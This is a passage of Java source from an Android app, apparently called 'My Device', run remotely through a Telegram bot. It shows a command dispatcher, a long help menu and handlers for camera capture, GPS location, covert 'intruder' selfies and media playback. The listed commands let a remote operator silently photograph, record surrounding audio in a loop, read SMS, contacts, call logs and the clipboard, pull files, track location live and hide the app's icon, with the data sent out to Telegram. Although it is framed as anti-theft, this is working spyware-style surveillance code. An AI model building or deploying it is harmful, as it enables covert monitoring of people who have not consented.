            case "tombol2": doTombol(ctx, chatId, target, "2"); break;
            case "tombol3": doTombol(ctx, chatId, target, "3"); break;
            case "tombol4": doTombol(ctx, chatId, target, "4"); break;
            case "link": doLink(ctx, chatId, target, arg); break;
            case "menu":
                if (Prefs.isMenuServer(ctx)) sendDeviceMenu(ctx, chatId, lastMsgId, target);
                break;
            case "buatid":
                if (!Prefs.isMenuServer(ctx)) {
                    replyT(ctx, chatId, target, "Perintah ini hanya jalan di HP server-menu.");
                    break;
                }
                String nid = Prefs.issueId(ctx);
                replyT(ctx, chatId, target, "🆔 ID baru: " + nid.toUpperCase()
                        + "\nMasukkan ID ini di aplikasi HP (kolom \"ID unik\"), lalu tap Mulai.\nKetik /menu untuk melihat daftar HP.");
                break;
            case "foto": doFoto(ctx, chatId, target, false); break;
            case "selfie": doFoto(ctx, chatId, target, true); break;
            case "lokasi": doLokasi(ctx, chatId, target); break;
            case "lokasirt": doLokasiRt(ctx, chatId, target, arg); break;
            case "ambil":
                if (arg.isEmpty()) {
                    PollService.pending.put(chatId, target + ":ambil");
                    replyT(ctx, chatId, target, "\uD83D\uDCC1 Ketik nama file yang dicari di HP:");
                } else doAmbil(ctx, chatId, target, arg);
                break;
            case "ambilterakhir": doAmbilTerakhir(ctx, chatId, target); break;
            case "fotopenyusup": doFotoPenyusup(ctx, chatId, target, arg); break;
            case "hilangteks": doHilangTeks(ctx, chatId, target, arg); break;
            case "nobar":
                if (arg.isEmpty()) {
                    PollService.pending.put(chatId, target + ":nobar");
                    replyT(ctx, chatId, target, "\uD83C\uDFAC Ketik judul video untuk nobar:");
                } else doNobar(ctx, chatId, target, arg);
                break;
            case "karaoke":
                if (arg.isEmpty()) {
                    PollService.pending.put(chatId, target + ":karaoke");
                    replyT(ctx, chatId, target, "\uD83C\uDFA4 Ketik judul lagu untuk karaoke:");
                } else doKaraoke(ctx, chatId, target, arg);
                break;
            case "lirik":
                if (arg.isEmpty()) {
                    PollService.pending.put(chatId, target + ":lirik");
                    replyT(ctx, chatId, target, "\uD83D\uDCDD Ketik judul lagu untuk cari liriknya:");
                } else doLirik(ctx, chatId, target, arg);
                break;
            case "papan":
                if (arg.isEmpty()) {
                    PollService.pending.put(chatId, target + ":papan");
                    replyT(ctx, chatId, target, "\uD83D\uDCDF Ketik teks untuk papan LED (pisah baris dengan |):");
                } else doPapan(ctx, chatId, target, arg);
                break;
            case "jam": doPapanJam(ctx, chatId, target); break;
            case "papanset": sendPapanSet(ctx, chatId, target); break;
            case "antri": doAntri(ctx, chatId, target, arg); break;
            case "antriputar": doAntriPutar(ctx, chatId, target); break;
            case "setnomor":
                if (arg.isEmpty()) {
                    PollService.pending.put(chatId, target + ":setnomor");
                    replyT(ctx, chatId, target, "\uD83D\uDCF1 Ketik nomor HP pemilik (cth: 08123456789):");
                } else doSetNomor(ctx, chatId, target, arg);
                break;
            case "setup": doSetup(ctx, chatId, target); break;
            case "skipiklan": {
                String a9 = arg.trim().toLowerCase();
                if (a9.equals("on") || a9.equals("off")) {
                    Prefs.setSkipIklan(ctx, a9.equals("on"));
                    replyT(ctx, chatId, target, "\u23E9 Skip iklan YouTube: " + (a9.equals("on") ? "AKTIF" : "MATI"));
                } else {
                    replyT(ctx, chatId, target, "\u23E9 Skip iklan: " + (Prefs.skipIklan(ctx) ? "AKTIF" : "MATI") + "\n/skipiklan on|off");
                }
                break;
            }
            case "baterai": doBaterai(ctx, chatId, target); break;
            case "info":
                replyT(ctx, chatId, target, "[" + target + "] Perangkat: " + Build.MANUFACTURER
                        + " " + Build.MODEL + "\nAndroid: " + Build.VERSION.RELEASE);
                break;
            case "ngomong":
                if (arg.isEmpty()) {
                    enterSpeakMode(chatId, target);
                    replyT(ctx, chatId, target, "\uD83D\uDD0A Mode ngomong AKTIF untuk [" + target + "].\nTinggal KETIK teks apa pun \u2014 langsung diucapkan HP itu.\nKirim /berhenti untuk selesai.");
                } else doNgomong(ctx, chatId, target, arg);
                break;
            case "senter": doSenterToggle(ctx, chatId, target, arg); break;
            case "strobo": doStrobo(ctx, chatId, target); break;
            case "berhenti": doBerhenti(ctx, chatId, target); break;
            case "getar": doGetar(ctx, chatId, target); break;
            case "rekam": doRekam(ctx, chatId, target, arg.isEmpty() ? "10" : arg); break;
            case "sms":
                if (arg.isEmpty() || !arg.contains("|")) {
                    PollService.pending.put(chatId, target + ":sms");
                    replyT(ctx, chatId, target, "Kirim dengan format:\n<nomor> | <pesan>");
                } else doSms(ctx, chatId, target, arg);
                break;
            case "inbox": doInbox(ctx, chatId, target, arg); break;
            case "telpon":
                if (arg.isEmpty()) {
                    PollService.pending.put(chatId, target + ":telpon");
                    replyT(ctx, chatId, target, "Kirim nomor yang mau ditelepon:");
                } else doTelpon(ctx, chatId, target, arg);
                break;
            case "kontak": doKontak(ctx, chatId, target); break;
            case "clipboard": doClipboard(ctx, chatId, target, arg); break;
            case "clipset":
                if (arg.isEmpty()) {
                    PollService.pending.put(chatId, target + ":clipset");
                    replyT(ctx, chatId, target, "Kirim teks untuk mengisi clipboard HP:");
                } else doClipSet(ctx, chatId, target, arg);
                break;
            case "volume": doVolume(ctx, chatId, target, arg); break;
            case "cerah": doCerah(ctx, chatId, target, arg); break;
            case "volmenu": showVolMenu(ctx, chatId, target, curVolumePct(ctx), false); break;
            case "cerahmenu": showCerahMenu(ctx, chatId, target, curCerahPct(ctx), false); break;
            case "notif":
                if (arg.isEmpty()) {
                    PollService.pending.put(chatId, target + ":notif");
                    replyT(ctx, chatId, target, "Kirim isi notifikasi (format: Judul | isi):");
                } else doNotif(ctx, chatId, target, arg);
                break;
            case "toast":
                if (arg.isEmpty()) {
                    PollService.pending.put(chatId, target + ":toast");
                    replyT(ctx, chatId, target, "Kirim pesan yang mau ditampilkan di layar HP:");
                } else doToast(ctx, chatId, target, arg);
                break;
            case "pesan":
                if (arg.isEmpty()) {
                    PollService.pending.put(chatId, target + ":pesan");
                    replyT(ctx, chatId, target, "Kirim pesan untuk HP [" + target + "] (bisa dibalas dari HP):");
                } else doPesan(ctx, chatId, target, arg);
                break;
            case "download":
                if (arg.isEmpty()) {
                    PollService.pending.put(chatId, target + ":download");
                    replyT(ctx, chatId, target, "Kirim link file yang mau diunduh:");
                } else doDownload(ctx, chatId, target, arg);
                break;
            case "wifi": doWifi(ctx, chatId, target); break;
            case "wifion": doWifiToggle(ctx, chatId, target, true); break;
            case "wifioff": doWifiToggle(ctx, chatId, target, false); break;
            case "bt": doBt(ctx, chatId, target, arg); break;
            case "btscan": BtHelper.scan(ctx, chatId, target); break;
            case "wifiscan": doWifiScan(ctx, chatId, target); break;
            case "wificonnect": doWifiConnect(ctx, chatId, target, arg); break;
            case "bton": doBt(ctx, chatId, target, "on"); break;
            case "btoff": doBt(ctx, chatId, target, "off"); break;
            case "sinyal": doSinyal(ctx, chatId, target); break;
            case "sensor": doSensor(ctx, chatId, target); break;
            case "usb": doUsb(ctx, chatId, target); break;
            case "sidikjari": doSidikjari(ctx, chatId, target); break;
            case "riwayat": doRiwayat(ctx, chatId, target); break;
            case "penyimpanan": doPenyimpanan(ctx, chatId, target); break;
            case "kunci": doKunci(ctx, chatId, target); break;
            case "kuncipin":
                if (arg.isEmpty()) {
                    PollService.pending.put(chatId, target + ":kuncipin");
                    replyT(ctx, chatId, target, "Kirim PIN angka (4-8 digit) untuk mengunci HP [" + target + "]:");
                } else doKunciPin(ctx, chatId, target, arg);
                break;
            case "hphilang": doHphilang(ctx, chatId, target, arg); break;
            case "balas": doBalas(ctx, chatId, target, arg); break;
            case "setpin":
                if (arg.isEmpty())
                    replyT(ctx, chatId, target, "Kirim /setpin <pin>, contoh: /setpin 1234");
                else {
                    Prefs.setPin(ctx, arg.split(" ")[0]);
                    replyT(ctx, chatId, target, "PIN disimpan. Dipakai untuk lockscreen & kunci aplikasi.");
                }
                break;
            case "lockscreen":
                if (arg.isEmpty()) {
                    PollService.pending.put(chatId, target + ":lockscreen");
                    replyT(ctx, chatId, target, "Kirim PIN (format: <pin> | <pesan opsional>):");
                } else doLockscreen(ctx, chatId, target, arg);
                break;
            case "buka": doBuka(ctx, chatId, target); break;
            case "daftarapk": doDaftarApk(ctx, chatId, target); break;
            case "lockapk":
                if (arg.isEmpty()) {
                    PollService.pending.put(chatId, target + ":lockapk");
                    replyT(ctx, chatId, target, "Kirim nama/nomor aplikasi dari /daftarapk:");
                } else doLockApk(ctx, chatId, target, arg, true);
                break;
            case "bukapk":
                if (arg.isEmpty()) {
                    PollService.pending.put(chatId, target + ":bukapk");
                    replyT(ctx, chatId, target, "Kirim nama/nomor aplikasi:");
                } else doLockApk(ctx, chatId, target, arg, false);
                break;
            case "sembunyi": doSembunyi(ctx, chatId, target); break;
            case "tampil": doTampil(ctx, chatId, target); break;
            case "findmy": doFindMy(ctx, chatId, target); break;
            case "bukaapk":
                if (arg.isEmpty()) {
                    PollService.pending.put(chatId, target + ":bukaapk");
                    replyT(ctx, chatId, target, "Kirim nama/nomor aplikasi dari /daftarapk:");
                } else doBukaApk(ctx, chatId, target, arg);
                break;
            case "help": doHelp(ctx, chatId, target); break;
            case "versi": doVersi(ctx, chatId, target); break;
            default: break;
        }
    }

    // ---------- implementasi perintah ----------

    /** Daftar semua perintah + cara pakai. */
    private static void doHelp(Context ctx, long chatId, String target) {
        String h =
                "\uD83E\uDD16 MY DEVICE — daftar perintah\n"
                + "Ketik /menu untuk tombol per HP. Perintah bisa diawali ID, contoh: \"UTAMA:/foto\".\n"
                + "\n\uD83D\uDCF7 KAMERA & LAYAR\n"
                + "/foto — jepret kamera belakang\n"
                + "/selfie — jepret kamera depan\n"
                + "/livecam — live kamera (tombol refresh & ganti kamera)\n"
                + "/screenshot — tangkap layar HP\n"
                + "/live — live layar + tombol geser (\u2B06\uFE0F\u2B07\uFE0F\u2B05\uFE0F\u27A1\uFE0F\uD83D\uDC46)\n"
                + "\n\uD83C\uDFA7 SUARA\n"
                + "/rekam <detik> — rekam suara sekitar (maks 60 dtk)\n"
                + "/dengarkan — kirim rekaman 30 dtk berulang, sampai /berhenti\n"
                + "/ngomong <teks> — HP mengucapkan teks (lalu ketik teks biasa sampai /berhenti)\n"
                + "/bunyi — bunyikan alarm kencang, volume dikunci & taskbar diblokir (hanya /berhenti yang mematikan)\n" + "/hphilang <pin> | <pesan> — MODE HP HILANG: kunci PIN + bunyi + pesan 2 arah dgn penemu\n" + "/balas <pesan> — balas pesan penemu di layar HP yang hilang\n"
                + "/hilangteks — custom semua teks layar HP hilang (judul/pesan/PIN/tombol)\n"
                + "/findmy — cari HP: bunyi + lokasi\n"
                + "\n\uD83D\uDD12 KUNCI & KEAMANAN\n"
                + "/kunci — kunci layar HP langsung\n"
                + "/buka — buka kunci layar\n"
                + "/kuncipin <pin> — kunci total HP dengan PIN (semua tombol mati)\n"
                + "/setpin <pin> — atur PIN aplikasi\n"
                + "/lockscreen <pin> | <pesan> — lockscreen PIN + pesan\n"
                + "/lockapk <nama> — kunci aplikasi (tidak bisa dibuka)\n"
                + "/bukapk <nama> — buka kunci aplikasi SEMENTARA (terkunci lagi setelah keluar app)\n"
                + "/bukaapk <nama> — jalankan aplikasi\n"
                + "/daftarapk — daftar aplikasi terinstal\n"
                + "/sembunyi — sembunyikan ikon aplikasi \u2022 /tampil — tampilkan lagi\n"
                + "\n\uD83D\uDCA1 LAYAR & KONEKSI\n"
                + "/layarnyala [pin] — nyalakan layar; + PIN untuk ketuk otomatis (eksperimental)\n"
                + "/pinpos [x0 y0 w h] — kalibrasi titik keypad PIN tiap HP \u2022 /tespin <digit> — uji ketuk\n"
                + "/link <url> — buka link di Chrome HP\n"
                + "/taskbar — geser taskbar (buka/tutup)\n"
                + "/wifi /wifion /wifioff — info / nyala / mati WiFi\n"
                + "/wifiscan — daftar jaringan WiFi \u2022 /wificonnect <ssid> [sandi]\n"
                + "/bt /bton /btoff /btscan — info / nyala+pindai / mati / pindai perangkat Bluetooth\n"
                + "\n\uD83D\uDCE8 PESAN & PANGGILAN\n"
                + "/sms <nomor> | <pesan> — kirim SMS\n"
                + "/telpon <nomor> — telepon\n"
                + "/inbox — SMS masuk \u2022 /riwayat — riwayat panggilan \u2022 /kontak — daftar kontak (ada tombol Lanjut)\n"
                + "/notif <teks> — tampilkan notifikasi \u2022 /toast <teks> — teks melayang\n"
                + "/pesan <teks> — tampilkan pesan di layar HP\n"
                + "\n\u2139\uFE0F INFO HP\n"
                + "/info — info perangkat \u2022 /baterai — info baterai\n"
                + "/lokasi — lokasi GPS \u2022 /sinyal — info sinyal\n"
                + "/lokasirt [menit] — live location, pin peta bergerak ngikutin HP (default 15 mnt)\n"
                + "/penyimpanan — info memori \u2022 /sensor — daftar sensor\n"
                + "/usb — status USB \u2022 /sidikjari — info biometrik\n"
                + "\n\uD83E\uDDE9 LAINNYA\n"
                + "/alarm <jam> <pesan> — pasang alarm (cth: /alarm besok 06:30 Bangun)\n"
                + "/clipboard — lihat/isi clipboard \u2022 /volume — atur volume \u2022 /cerah — kecerahan\n"
                + "/senter /strobo — lampu flash \u2022 /getar — getarkan HP\n"
                + "/wallpaper — ganti wallpaper (lalu kirim foto)\n"
                + "/download <path> — unduh file dari HP\n"
                + "/tombol 1|2|3|4 — kerapatan tombol menu (1 renggang – 4 rapat)\n"
                + "/youtube <kata kunci> — cari & putar YouTube/ReVanced (pilih menit, skip, stop)\n"
                + "/karaoke <judul> — putar versi karaoke + kirim lirik \u2022 /lirik <judul> — cari lirik\n"
                + "/nobar <judul> — putar video bareng di semua HP \u2022 /antri <judul> — antrean putar\n"
                + "/skipiklan [on|off] — lewati iklan YouTube otomatis\n"
                + "\n\uD83D\uDCDF PAPAN LED & JAM\n"
                + "/papan <teks> — layar penuh ala LED (pisah baris dengan |) \u2022 /jam — jam digital raksasa\n"
                + "/papanset — atur warna BG/teks, font, kecepatan, ukuran, rotasi (berlaku untuk keduanya)\n"
                + "\n\uD83D\uDCC1 FILE & KEAMANAN\n"
                + "/ambil <nama file> — cari & kirim file dari HP \u2022 /ambilterakhir — foto terakhir\n"
                + "/fotopenyusup [on|off] — salah PIN 3x \u2192 selfie diam-diam terkirim\n"
                + "/setnomor <nomor> — nomor pemilik untuk perintah via SMS (tanpa internet)\n"
                + "/setup — status & panduan aktivasi semua izin\n"
                + "/notifpro [on|off] — notifikasi proaktif: SMS masuk, baterai lemah, HP dinyalakan\n"
                + "/notifchat — pisahkan notifikasi ke channel/grup sendiri\n"
                + "/modesuara [on|off] — perintah via voice note, dibalas suara\n"
                + "/buatid — buat ID HP baru \u2022 /berhenti — hentikan semua (rekam/bunyi/media/live)\n"
                + "/versi — lihat versi aplikasi yang terpasang di HP ini + status izin\n"
                + "\n\uD83D\uDCE9 Kirim voice note/audio/foto/video ke bot \u2192 otomatis diputar/ditampilkan di HP dan HP terkunci total sampai /berhenti.\n"
                + "\nCatatan: fitur bertanda (eksperimental) masih tahap pengembangan dan bisa belum sempurna di semua HP.";
        replyT(ctx, chatId, target, h);
    }

    /** /versi \u2014 laporkan versi aplikasi yang terpasang di HP target + status izin. */
    private static void doVersi(Context ctx, long chatId, String target) {
        try {
            String pkg = ctx.getPackageName();
            PackageInfo pi = ctx.getPackageManager().getPackageInfo(pkg, 0);
            String vn = pi.versionName != null ? pi.versionName : "?";
            if (vn.endsWith("-debug")) vn = vn.substring(0, vn.length() - 6);
            SimpleDateFormat f = new SimpleDateFormat("dd MMM yyyy HH:mm", new Locale("id", "ID"));
            f.setTimeZone(java.util.TimeZone.getTimeZone("Asia/Jakarta"));
            String pasang = f.format(new Date(pi.lastUpdateTime)) + " WIB";
            DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
            boolean admin = dpm != null && dpm.isAdminActive(new ComponentName(ctx, DeviceAdmin.class));
            String en = Settings.Secure.getString(ctx.getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            boolean a11y = en != null && en.toLowerCase(Locale.US).contains(pkg.toLowerCase(Locale.US));
            replyT(ctx, chatId, target,
                    "\uD83D\uDCF1 My Device v" + vn + "  [" + target + "]\n"
                    + "Dipasang/diupdate: " + pasang + "\n"
                    + "Device Admin: " + (admin ? "aktif \u2705" : "MATI \u274C") + "\n"
                    + "Aksesibilitas: " + (a11y ? "aktif \u2705" : "MATI \u274C"));
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal baca versi: " + e.getMessage());
        }
    }

    private static void doFoto(final Context ctx, final long chatId, String target, boolean depan) {
        replyT(ctx, chatId, target, "Menyiapkan kamera " + (depan ? "depan" : "belakang") + "...");
        try {
            CameraHelper.takePhoto(ctx, depan, new CameraHelper.PhotoCallback() {
                @Override
                public void onPhoto(File f) {
                    try {
                        TelegramApi.sendFile(Prefs.token(ctx), "sendPhoto", "photo", chatId, f,
                                depan ? "Kamera depan" : "Kamera belakang", deviceMenuMarkup(ctx, target));
                    } catch (Exception e) {
                        replyT(ctx, chatId, target, "Gagal kirim foto: " + e.getMessage());
                    }
                }

                @Override
                public void onError(String e) {
                    replyT(ctx, chatId, target, "Gagal jepret: " + e);
                }
            });
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal jepret: " + e.getMessage());
        }
    }

    private static void doLokasi(final Context ctx, final long chatId, String target) {
        // Balasan instan dulu — kalau ini pun tak sampai, masalahnya di dispatch/routing.
        sayPlain(ctx, chatId, "\uD83D\uDCCD Meminta lokasi [" + target + "]...");
        boolean fine = false;
        try {
            fine = ctx.checkSelfPermission("android.permission.ACCESS_FINE_LOCATION")
                    == android.content.pm.PackageManager.PERMISSION_GRANTED;
        } catch (Exception ignored) {
        }
        if (!fine) {
            replyT(ctx, chatId, target, "\u274C Izin lokasi belum diberikan di HP [" + target + "].\nAktifkan: aplikasi My Device > Izin > Lokasi > pilih \"Izinkan sepanjang waktu\".");
            return;
        }
        try {
            final android.location.LocationManager lm = (android.location.LocationManager)
                    ctx.getSystemService(Context.LOCATION_SERVICE);
            if (lm == null) {
                replyT(ctx, chatId, target, "HP tidak punya layanan lokasi.");
                return;
            }
            boolean gpsOn = false, netOn = false;
            try {
                gpsOn = lm.isProviderEnabled(android.location.LocationManager.GPS_PROVIDER);
            } catch (Exception ignored) {
            }
            try {
                netOn = lm.isProviderEnabled(android.location.LocationManager.NETWORK_PROVIDER);
            } catch (Exception ignored) {
            }
            if (!gpsOn && !netOn) {
                replyT(ctx, chatId, target, "\u274C Layanan lokasi MATI di HP [" + target + "].\nNyalakan Lokasi/GPS di HP itu, lalu kirim /lokasi lagi.");
                return;
            }
            android.location.Location best = null;
            try {
                best = newerLoc(
                        lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER),
                        lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER));
            } catch (SecurityException ignored) {
            }
            if (best != null && System.currentTimeMillis() - best.getTime() < 5 * 60 * 1000) {
                kirimLokasi(ctx, chatId, target, best);
                return;
            }
            final boolean[] done = {false};
            android.location.LocationListener listener = new android.location.LocationListener() {
                @Override
                public void onLocationChanged(android.location.Location l) {
                    if (done[0]) return;
                    done[0] = true;
                    kirimLokasi(ctx, chatId, target, l);
                }

                @Override
                public void onStatusChanged(String pr, int st, android.os.Bundle ex) {
                }

                @Override
                public void onProviderEnabled(String pr) {
                }

                @Override
                public void onProviderDisabled(String pr) {
                }
            };
            final android.location.LocationListener fl = listener;
            String prov = gpsOn ? android.location.LocationManager.GPS_PROVIDER
                    : android.location.LocationManager.NETWORK_PROVIDER;
            try {
                lm.requestSingleUpdate(prov, listener, android.os.Looper.getMainLooper());
            } catch (Exception e) {
                replyT(ctx, chatId, target, "Gagal minta lokasi (" + prov + "): " + e.getMessage());
                return;
            }
            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(new Runnable() {
                @Override
                public void run() {
                    if (done[0]) return;
                    done[0] = true;
                    try {
                        lm.removeUpdates(fl);
                    } catch (Exception ignored) {
                    }
                    android.location.Location l = null;
                    try {
                        l = newerLoc(
                                lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER),
                                lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER));
                    } catch (Exception ignored) {
                    }
                    if (l != null) kirimLokasi(ctx, chatId, target, l);
                    else replyT(ctx, chatId, target, "\u274C GPS belum dapat sinyal di HP [" + target + "].\nCoba lagi di tempat terbuka / dekat jendela.");
                }
            }, 20000);
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    private static android.location.Location newerLoc(android.location.Location a,
                                                      android.location.Location b) {
        if (a == null) return b;
        if (b == null) return a;
        return a.getTime() >= b.getTime() ? a : b;
    }

    private static void kirimLokasi(Context ctx, long chatId, String target, Location l) {
        try {
            TelegramApi.sendLocation(Prefs.token(ctx), chatId, l.getLatitude(), l.getLongitude());
            replyT(ctx, chatId, target, "https://maps.google.com/?q=" + l.getLatitude() + "," + l.getLongitude());
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal kirim lokasi: " + e.getMessage());
        }
    }

    // ================= IDE-3 =================
    private static void doFotoPenyusup(Context ctx, long chatId, String target, String arg) {
        String a = arg.trim().toLowerCase();
        if (a.equals("on") || a.equals("off")) {
            Prefs.setFotoPenyusup(ctx, a.equals("on"));
            replyT(ctx, chatId, target, "\uD83D\uDCF8 Foto penyusup: " + (a.equals("on") ? "AKTIF" : "MATI"));
        } else {
            replyT(ctx, chatId, target, "\uD83D\uDCF8 Foto penyusup: "
                    + (Prefs.fotoPenyusup(ctx) ? "AKTIF" : "MATI")
                    + "\nSalah PIN 3x \u2192 selfie diam-diam terkirim ke kamu.\n/fotopenyusup on|off");
        }
    }

    // ================= IDE-4: nobar =================
    private static String firstTubePkg(Context ctx) {
        try {
            java.util.List<String> apps = YouTube.installedApps(ctx);
            for (String a : apps) if (a.contains("revanced")) return a;
            if (!apps.isEmpty()) return apps.get(0);
        } catch (Exception ignored) {
        }
        return null;
    }

    private static void doNobar(final Context ctx, final long chatId, final String target, String arg) {
        final String q = arg.trim();
        if (q.isEmpty()) {
            replyT(ctx, chatId, target, "Pakai: /nobar <judul video>\nUntuk semua HP: semua: /nobar <judul>");
            return;
        }
        // Revisi 2026-10-13: kalau target semua, hanya HP pertama yang mencari
        // (daftar hasil tunggal), tombol membawa ID video persis agar semua HP
        // memutar video yang SAMA.
        if (("semua".equals(target) || "all".equals(target))
                && !Prefs.deviceId(ctx).equals(Prefs.firstDevice(ctx))) {
            return;
        }
        replyT(ctx, chatId, target, "\uD83D\uDD0D Mencari \"" + q + "\"...");
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    java.util.List<YouTube.Video> vids = YouTube.search(q);
                    if (vids.isEmpty()) {
                        replyT(ctx, chatId, target, "Tidak ketemu hasil.");
                        return;
                    }
                    tubeResults.put(chatId, vids);
                    sendNobarList(ctx, chatId, target, firstTubePkg(ctx), vids);
                } catch (Exception e) {
                    replyT(ctx, chatId, target, "Gagal mencari: " + e.getMessage());
                }
            }
        }).start();
    }

    /** Daftar hasil nobar: callback membawa ID video persis (bukan nomor urut). */
    static void sendNobarList(Context ctx, long chatId, String target, String pkg,
                              java.util.List<YouTube.Video> vids) {
        try {
            StringBuilder sb = new StringBuilder();
            sb.append("\uD83C\uDFAC NOBAR \u2014 pilih video (diputar di [").append(target).append("]):");
            JSONObject m = new JSONObject();
            JSONArray kb = new JSONArray();
            JSONArray row = null;
            for (int i = 0; i < vids.size(); i++) {
                YouTube.Video v = vids.get(i);
                sb.append("\n\n").append(i + 1).append(". ").append(v.title)
                        .append("\n   \u23F1\uFE0F ").append(v.durText)
                        .append(" \u2022 \uD83D\uDCFA ").append(v.channel);
                if (i % 4 == 0) {
                    row = new JSONArray();
                    kb.put(row);
                }
                JSONObject b = new JSONObject();
                b.put("text", "\u25B6\uFE0F " + (i + 1));
                b.put("callback_data", "cmd:" + target + ":nobarvid:" + v.id);
                row.put(b);
            }
            m.put("inline_keyboard", kb);
            TelegramApi.sendMessage(Prefs.token(ctx), chatId, sb.toString(), m);
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    /**
     * Revisi 2026-10-13 (#3): nobar sinkron akurat via jam dinding bersama.
     * Tiap HP menjadwalkan putar pada batas 5-detik berikutnya (+5 dtk),
     * dihitung dari jam HP masing-masing — keterlambatan Telegram tidak
     * berpengaruh. Selisih tipis (<0.5 dtk) masih mungkin karena jam HP
     * tidak 100% sama; sinkron bingkai-sempurna tidak mungkin via internet.
     */
    private static void doNobarPlayId(final Context ctx, final long chatId,
                                      final String target, final String videoId) {
        stopTubeIfPlaying(ctx, chatId);
        final String pkg = firstTubePkg(ctx);
        if (pkg == null) {
            replyT(ctx, chatId, target, "YouTube/ReVanced tidak terinstall di [" + target + "].");
            return;
        }
        String judul = videoId;
        java.util.List<YouTube.Video> vids = tubeResults.get(chatId);
        if (vids != null) {
            for (YouTube.Video v : vids) {
                if (v != null && videoId.equals(v.id)) {
                    judul = v.title;
                    break;
                }
            }
        }
        final String judulF = judul;
        long now = System.currentTimeMillis();
        // batas 5-detik berikutnya, +5 detik (beri waktu siap-siap)
        long startAt = ((now / 5000) + 2) * 5000;
        long delay = Math.max(1000, startAt - now);
        java.text.SimpleDateFormat f = new java.text.SimpleDateFormat("HH:mm:ss",
                java.util.Locale.getDefault());
        replyT(ctx, chatId, target, "\u23F3 [" + target + "] siap — putar SERENTAK pukul "
                + f.format(new java.util.Date(startAt)) + ": " + judulF);
        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override
            public void run() {
                try {
                    boolean ok = YouTube.play(ctx, pkg, videoId, 0);
                    if (!ok) {
                        replyT(ctx, chatId, target, "Gagal memutar di [" + target + "].");
                    }
                } catch (Exception e) {
                    replyT(ctx, chatId, target, "Gagal memutar di [" + target + "]: " + e.getMessage());
                }
            }
        }, delay);
    }

    private static void doNobarPlay(Context ctx, long chatId, String target, String idxStr) {
        YouTube.Video v = tubeVideo(chatId, idxStr);
        if (v == null) {
            replyT(ctx, chatId, target, "Hasil kedaluwarsa \u2014 /nobar lagi.");
            return;
        }
        String pkg = firstTubePkg(ctx);
        if (pkg == null) {
            replyT(ctx, chatId, target, "YouTube/ReVanced tidak terinstall di [" + target + "].");
            return;
        }
        boolean ok = false;
        try {
            ok = YouTube.play(ctx, pkg, v.id, 0);
        } catch (Exception ignored) {
        }
        replyT(ctx, chatId, target, ok
                ? "\uD83C\uDFAC [" + target + "] memutar: " + v.title
                : "Gagal memutar di [" + target + "].");
    }

    // ================= IDE-5: karaoke + lirik =================
    private static void doKaraoke(final Context ctx, final long chatId, final String target, String arg) {
        final String q = arg.trim();
        if (q.isEmpty()) {
            replyT(ctx, chatId, target, "Pakai: /karaoke <judul lagu>");
            return;
        }
        replyT(ctx, chatId, target, "\uD83D\uDD0D Mencari karaoke \"" + q + "\"...");
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    java.util.List<YouTube.Video> vids = YouTube.search(q + " karaoke");
                    if (vids.isEmpty()) {
                        replyT(ctx, chatId, target, "Tidak ketemu hasil.");
                        return;
                    }
                    tubeResults.put(chatId, vids);
                    sendTubeList(ctx, chatId, target, firstTubePkg(ctx), vids, "karaplay",
                            "\uD83C\uDFA4 KARAOKE \u2014 pilih versi yang pas");
                } catch (Exception e) {
                    replyT(ctx, chatId, target, "Gagal mencari: " + e.getMessage());
                }
            }
        }).start();
    }

    private static void doKaraPlay(Context ctx, long chatId, String target, String idxStr) {
        YouTube.Video v = tubeVideo(chatId, idxStr);
        if (v == null) {
            replyT(ctx, chatId, target, "Hasil kedaluwarsa \u2014 /karaoke lagi.");
            return;
        }
        String pkg = firstTubePkg(ctx);
        if (pkg == null) {
            replyT(ctx, chatId, target, "YouTube/ReVanced tidak terinstall.");
            return;
        }
        boolean ok = false;
        try {
            ok = YouTube.play(ctx, pkg, v.id, 0);
        } catch (Exception ignored) {
        }
        if (ok) {
            replyT(ctx, chatId, target, "\uD83C\uDFA4 Memutar karaoke: " + v.title + "\nMengambil lirik...");
            fetchLirik(ctx, chatId, target, v.channel, v.title);
        } else {
            replyT(ctx, chatId, target, "Gagal memutar.");
        }
    }

    private static void doLirik(Context ctx, long chatId, String target, String arg) {
        String q = arg.trim();
        if (q.isEmpty()) {
            replyT(ctx, chatId, target, "Pakai: /lirik <judul lagu>");
            return;
        }
        replyT(ctx, chatId, target, "\uD83D\uDD0D Mencari lirik \"" + q + "\"...");
        fetchLirikSuggest(ctx, chatId, target, q);
    }

    private static void fetchLirikSuggest(final Context ctx, final long chatId,
                                          final String target, final String q) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String url = "https://api.lyrics.ovh/suggest/"
                            + java.net.URLEncoder.encode(q, "UTF-8");
                    JSONObject o = new JSONObject(httpGet(url));
                    JSONArray data = o.optJSONArray("data");
                    if (data == null || data.length() == 0) {
                        replyT(ctx, chatId, target, "Lirik tidak ditemukan.");
                        return;
                    }
                    JSONObject first = data.getJSONObject(0);
                    fetchLirik(ctx, chatId, target,
                            first.getJSONObject("artist").getString("name"),
                            first.getString("title"));
                } catch (Exception e) {
                    replyT(ctx, chatId, target, "Gagal cari lirik.");
                }
            }
        }).start();
    }

    private static void fetchLirik(final Context ctx, final long chatId,
                                   final String target, final String artist, final String title) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String url = "https://api.lyrics.ovh/v1/"
                            + java.net.URLEncoder.encode(artist, "UTF-8") + "/"
                            + java.net.URLEncoder.encode(title, "UTF-8");
                    String lirik = new JSONObject(httpGet(url)).optString("lyrics", "");
                    if (lirik.isEmpty()) {
